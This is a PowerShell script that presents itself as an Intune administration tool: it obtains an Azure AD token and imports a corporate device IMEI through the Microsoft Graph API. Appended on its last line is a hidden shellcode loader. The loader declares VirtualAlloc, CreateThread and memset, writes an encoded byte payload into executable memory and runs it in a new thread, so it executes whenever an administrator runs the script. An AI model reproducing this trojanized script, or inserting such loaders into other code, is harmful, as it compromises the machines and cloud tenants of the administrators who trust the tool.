




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Add-CorporateDeviceIdentifiers(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    [ValidateSet("imei","serialNumber")]
    $IdentifierType,
    [Parameter(Mandatory=$true)]
    [ValidateSet("false","true")]
    $OverwriteImportedDeviceIdentities,
    [Parameter(Mandatory=$true)]
    $Identifier,
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [string]
    $Description
)


$graphApiVersion = "beta"
$Resource = "deviceManagement/importedDeviceIdentities/importDeviceIdentityList"

    try {

$JSON = @"

{
"overwriteImportedDeviceIdentities": $OverwriteImportedDeviceIdentities,
"importedDeviceIdentities": [ { 
"importedDeviceIdentifier": "$Identifier",
"importedDeviceIdentityType": "$IdentifierType",
"description": "$Description"}
]
}

"@

        if($IdentifierType -eq "imei"){

            if(($Identifier -match "^[0-9]+$") -and ($Identifier.length -ge 15)){

                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
                (Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken).value

            }

            elseif($Identifier -notmatch "^[0-9]+$" -or ($Identifier.length -lt 15)) {

                Write-Host "Invalid Device Identifier '$Identifier' parameter found for $IdentifierType Identity Type..." -ForegroundColor Red

            }

        }

        if($IdentifierType -eq "serialNumber"){

            if(($Identifier -match "^[a-zA-Z0-9]+$") -and (@($Description).length -le 128)){

                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
                (Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken).value

            }

            elseif($Identifier -notmatch "^[a-zA-Z0-9]+$"){

                Write-Host "Invalid Device Identifier '$Identifier' parameter found for $IdentifierType Identity Type..." -ForegroundColor Red

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    $line = $_.InvocationInfo.ScriptLineNumber
    $msg = $ex.message
    $ErrorMessage += "$responseBody`n"
    $ErrorMessage += "Exception: $msg on line $line"
    Write-Error $ErrorMessage
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$Status = Add-CorporateDeviceIdentifiers -IdentifierType imei -OverwriteImportedDeviceIdentities false -Identifier "123456789012345" -Description "Test Device"

if($Status.status -eq $true) {

    Write-Host "Device" $status.importedDeviceIdentifier "added to the Intune Service..." -ForegroundColor Green
    $Status

}

elseif($Status.status -eq $false) {

    Write-Host "Device" $status.importedDeviceIdentifier "import failed, the device identifier could have already been added to the service..." -ForegroundColor Red

}

Write-Host
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

